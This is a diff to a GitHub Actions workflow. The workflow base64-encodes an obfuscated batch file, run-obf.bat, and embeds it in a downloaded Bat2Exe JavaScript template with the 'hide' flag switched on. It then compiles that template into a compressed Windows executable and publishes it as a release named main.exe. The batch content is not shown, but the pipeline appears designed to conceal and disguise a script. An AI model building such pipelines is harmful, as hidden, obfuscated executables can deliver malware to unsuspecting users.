@@ -1,4 +1,4 @@
-name: Obfuscate File and Upload
+name: Obfuscate File and Upload Exe
 
 on:
   push:
@@ -27,14 +27,31 @@ jobs:
         run: |
           python main.py
 
-      - name: Download bat2exeIEXP.bat
+      - name: Base64 Encode run-obf.bat
+        id: base64_encode
         run: |
-          Invoke-WebRequest -Uri https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/iexpress/bat2exeIEXP.bat -OutFile bat2exeIEXP.bat
+          $base64Encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes('run-obf.bat'))
+          [IO.File]::WriteAllText('encoded.b64', $base64Encoded)
 
-      - name: Convert BAT to EXE
+      - name: Download and Modify template.js
         run: |
-          # Convert the BAT file to EXE
-          Start-Process -FilePath cmd.exe -ArgumentList '/c bat2exeIEXP.bat run-obf.bat run-obf.exe' -Wait
+          Invoke-WebRequest -Uri https://raw.githubusercontent.com/KDot227/Bat2Exe/main/src/to_compile/static/template.js -OutFile template.js
+          (Get-Content template.js) -replace 'const hide = false;', 'const hide = true;' | 
+          (Get-Content) -replace 'BASE64ENCODEDSTUFFHERE', (Get-Content encoded.b64) | 
+          Set-Content modified.js
+
+      - name: Install Node.js and Required Packages
+        uses: actions/setup-node@v3
+        with:
+          node-version: '18'
+          
+      - name: Install pkg
+        run: |
+          npm install -g pkg
+
+      - name: Obfuscate JavaScript File
+        run: |
+          pkg modified.js --compress GZip -t node18-win
 
       - name: Delete-tag-and-release
         uses: dev-drprasad/delete-tag-and-release@v1.1
@@ -62,6 +79,6 @@ jobs:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         with:
           upload_url: ${{ steps.create_release.outputs.upload_url }}
-          asset_path: run-obf.exe
+          asset_path: modified.exe
           asset_name: main.exe
           asset_content_type: application/octet-stream
